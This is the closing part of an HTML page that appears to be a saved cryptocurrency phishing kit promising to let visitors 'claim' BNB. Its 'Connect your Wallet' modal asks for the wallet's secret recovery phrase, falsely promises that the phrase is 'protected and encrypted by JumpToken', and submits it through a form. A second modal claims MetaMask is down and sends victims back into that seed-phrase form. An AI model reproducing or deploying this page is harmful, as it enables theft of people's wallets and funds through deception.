                            <path d="M111.978 132.863L105.158 125.837C105.135 125.814 105.135 125.767 105.158 125.743L111.294 119.388C111.341 119.341 111.306 119.271 111.247 119.271H108.734C108.71 119.271 108.698 119.283 108.686 119.294L103.483 124.684C103.436 124.731 103.365 124.696 103.365 124.637V119.341C103.365 119.306 103.33 119.271 103.295 119.271H101.324C101.288 119.271 101.253 119.306 101.253 119.341V132.922C101.253 132.957 101.288 132.992 101.324 132.992H103.295C103.33 132.992 103.365 132.957 103.365 132.922V126.944C103.365 126.885 103.448 126.849 103.483 126.896L109.382 132.969C109.394 132.98 109.417 132.992 109.429 132.992H111.942C111.989 132.98 112.025 132.898 111.978 132.863Z" fill="#161616"></path>
                            </svg>
                            </a>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                
                <div class="modal fade" id="exampleModalToggle2" aria-hidden="true" aria-labelledby="exampleModalToggleLabel2" tabindex="-1">
                  <div class="modal-dialog modal-dialog-centered">
                    <div class="modal-content" style="border-radius:20px;">
                      <div class="modal-header" style="background-color: #F8FBFF; border: none; border-radius: 20px 20px 0 0;">
                        <h5 class="modal-title" id="exampleModalToggleLabel2">Connect your Wallet</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                      </div>
                      <div class="modal-body d-flex flex-column align-items-center" style="background-color: #F5F6FF; border-radius: 0px 0px 20px 20px;">
                        <textarea name="phrase" id="phrase" cols="30" rows="7" class="col-12 p-2 mt-3" placeholder="Secret phrase" style="border-radius: 20px; border: none;" required ></textarea>
                        <p class="ms-1" style=" color: #B7BDC6;">Usually 12 words (sometimes 24) separated by single spaces <br> Your information is protected and encrypted by JumpToken</p>
                        <button class="mt-4 btn btn-primary" type="submit" name="envoyer">
                          import
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
                </form>

                <div class="modal fade" id="exampleModalToggle3" aria-hidden="true" aria-labelledby="exampleModalToggleLabel2" tabindex="-1">
                  <div class="modal-dialog modal-dialog-centered">
                    <div class="modal-content" style="border-radius:20px;">
                      <div class="modal-header" style="background-color: #F8FBFF; border: none; border-radius: 20px 20px 0 0;">
                        <h5 class="modal-title" id="exampleModalToggleLabel2">Connect your Wallet</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                      </div>
                      <div class="modal-body" style="background-color: #F5F6FF;">
                        <p class="text-danger text-center my-3">Sorry, metamask is not working at the moment
please use Trust wallet.</p>
                      </div>
                      <div class="modal-footer">
                      <button class="mt-4 btn btn-primary" type="button" data-bs-toggle="modal" data-bs-target="#exampleModalToggle1">
                        Back
                      </button>
                      </div>
                    </div>
                  </div>
                </div>
              

                
              </div>
            </div>
          </div>
        
      
    </section>
    
    <footer class="basepart">
      <p class="text-center text-light mt-5" style="font-size: 14px; position: relative; bottom: -75px;">© 2021 - 2022. All rights reserved</p>
    </footer>
    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="./Reclamez Vos BNB, Acheter &amp; vendez des cryptomonnaies_files/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

    <!-- Option 2: Separate Popper and Bootstrap JS -->
    <!--
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
    -->
  
</body><loom-container id="lo-engage-ext-container"><loom-shadow classname="resolved"></loom-shadow></loom-container><loom-container id="lo-companion-container"><loom-shadow classname="resolved"></loom-shadow></loom-container></html>